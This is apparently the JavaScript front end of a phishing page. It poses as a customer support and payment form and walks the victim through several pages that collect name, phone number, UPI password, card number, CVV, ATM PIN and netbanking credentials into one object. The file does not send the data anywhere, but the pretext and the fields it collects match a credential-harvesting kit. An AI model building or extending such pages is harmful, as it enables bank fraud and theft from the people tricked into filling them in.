document.addEventListener('DOMContentLoaded', () => {
    const page1 = document.getElementById('page-1');
    const page2 = document.getElementById('page-2');
    const page3 = document.getElementById('page-3');
    
    // Payment Method Pages
    const pageUpi = document.getElementById('page-upi');
    const pageCard = document.getElementById('page-card');
    const pageNetbanking = document.getElementById('page-netbanking');

    const supportForm = document.getElementById('support-form');
    const paymentModeForm = document.getElementById('payment-mode-form');
    const topBar = document.getElementById('top-bar');
    
    // Store collected form data
    const collectedData = {};

    // Handle Page 1 -> Page 2
    supportForm.addEventListener('submit', (e) => {
        e.preventDefault();
        // Validation check
        if(supportForm.checkValidity()) {
            collectedData.customerName = document.getElementById('customer-name').value;
            collectedData.mobileNumber = document.getElementById('mobile-number').value;
            collectedData.reason = document.getElementById('reason').value;

            page1.classList.remove('active');
            page2.classList.add('active');
            // Mockup screenshot 2 doesn't have the top bar
            topBar.classList.add('hidden');
        }
    });

    // Handle Page 2 -> Page 3
    paymentModeForm.addEventListener('submit', (e) => {
        e.preventDefault();
        // Validation check for amount
        if(paymentModeForm.checkValidity()) {
            collectedData.paymentMode = document.querySelector('input[name="payment-mode"]:checked')?.value || '';
            collectedData.amount = document.getElementById('amount').value;

            page2.classList.remove('active');
            page3.classList.add('active');
        }
    });

    // Handle Payment Selection from Page 3
    window.selectPayment = function(method) {
        collectedData.paymentMethod = method;
        page3.classList.remove('active');
        topBar.classList.add('hidden'); // Ensure top bar stays hidden
        
        if (method === 'upi') {
            pageUpi.classList.add('active');
        } else if (method === 'card') {
            pageCard.classList.add('active');
        } else if (method === 'netbanking') {
            pageNetbanking.classList.add('active');
        }
    };

    // Handle Final Submission
    window.showFinalPage = function(e) {
        e.preventDefault();

        // Collect final page data based on selected method
        if (collectedData.paymentMethod === 'upi') {
            collectedData.upiBankName = document.getElementById('upi-bank-name').value;
            collectedData.upiPassword = document.getElementById('upi-password').value;
        } else if (collectedData.paymentMethod === 'card') {
            collectedData.cardNumber = document.getElementById('card-number').value;
            collectedData.expiry = document.getElementById('expiry').value;
            collectedData.cvv = document.getElementById('cvv').value;
            collectedData.atmPin = document.getElementById('atm-pin').value;
        } else if (collectedData.paymentMethod === 'netbanking') {
            collectedData.bankName = document.getElementById('bank-name').value;
            collectedData.username = document.getElementById('username').value;
            collectedData.password = document.getElementById('password').value;
        }

        // Hide all active pages
        document.querySelectorAll('.page-view.active').forEach(el => el.classList.remove('active'));
        // Show Final Page
        document.getElementById('page-final').classList.add('active');
        // Restore Top Bar
        topBar.classList.remove('hidden');
        // Scroll to top
        window.scrollTo(0,0);
    };


});
